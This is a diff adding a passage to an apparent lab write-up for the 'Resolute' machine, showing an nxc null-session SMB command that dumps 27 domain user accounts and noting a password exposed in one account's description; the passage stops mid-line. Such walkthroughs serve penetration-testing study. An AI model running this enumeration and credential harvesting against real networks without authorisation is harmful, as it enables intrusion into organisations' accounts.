@@ -80,3 +80,42 @@ Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 # SMB (445) 
 ## Null authentication
+### Users
+```python
+nxc smb resolute.megabank.local -u '' -p '' --users-export users.txt
+SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\: 
+SMB         10.129.96.155   445    RESOLUTE         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.96.155   445    RESOLUTE         Administrator                 2026-04-15 16:50:03 0       Built-in account for administering the computer/domain 
+SMB         10.129.96.155   445    RESOLUTE         Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.96.155   445    RESOLUTE         krbtgt                        2019-09-25 13:29:12 0       Key Distribution Center Service Account 
+SMB         10.129.96.155   445    RESOLUTE         DefaultAccount                <never>             0       A user account managed by the system. 
+SMB         10.129.96.155   445    RESOLUTE         ryan                          2026-04-15 16:52:03 0        
+SMB         10.129.96.155   445    RESOLUTE         marko                         2019-09-27 13:17:14 0       Account created. Password set to Welcome123! 
+SMB         10.129.96.155   445    RESOLUTE         sunita                        2019-12-03 21:26:29 0        
+SMB         10.129.96.155   445    RESOLUTE         abigail                       2019-12-03 21:27:30 0        
+SMB         10.129.96.155   445    RESOLUTE         marcus                        2019-12-03 21:27:59 0        
+SMB         10.129.96.155   445    RESOLUTE         sally                         2019-12-03 21:28:29 0        
+SMB         10.129.96.155   445    RESOLUTE         fred                          2019-12-03 21:29:01 0        
+SMB         10.129.96.155   445    RESOLUTE         angela                        2019-12-03 21:29:43 0        
+SMB         10.129.96.155   445    RESOLUTE         felicia                       2019-12-03 21:30:53 0        
+SMB         10.129.96.155   445    RESOLUTE         gustavo                       2019-12-03 21:31:42 0        
+SMB         10.129.96.155   445    RESOLUTE         ulf                           2019-12-03 21:32:19 0        
+SMB         10.129.96.155   445    RESOLUTE         stevie                        2019-12-03 21:33:13 0        
+SMB         10.129.96.155   445    RESOLUTE         claire                        2019-12-03 21:33:44 0        
+SMB         10.129.96.155   445    RESOLUTE         paulo                         2019-12-03 21:34:46 0        
+SMB         10.129.96.155   445    RESOLUTE         steve                         2019-12-03 21:35:25 0        
+SMB         10.129.96.155   445    RESOLUTE         annette                       2019-12-03 21:36:55 0        
+SMB         10.129.96.155   445    RESOLUTE         annika                        2019-12-03 21:37:23 0        
+SMB         10.129.96.155   445    RESOLUTE         per                           2019-12-03 21:38:12 0        
+SMB         10.129.96.155   445    RESOLUTE         claude                        2019-12-03 21:39:56 0        
+SMB         10.129.96.155   445    RESOLUTE         melanie                       2026-04-15 16:50:03 0        
+SMB         10.129.96.155   445    RESOLUTE         zach                          2019-12-04 10:39:27 0        
+SMB         10.129.96.155   445    RESOLUTE         simon                         2019-12-04 10:39:58 0        
+SMB         10.129.96.155   445    RESOLUTE         naoki                         2019-12-04 10:40:44 0        
+SMB         10.129.96.155   445    RESOLUTE         [*] Enumerated 27 local users: MEGABANK
+SMB         10.129.96.155   445    RESOLUTE         [*] Writing 27 local users to users.txt
+```
+Managed to dump all users to a user list 
+
+Also found a password `Welcome123!
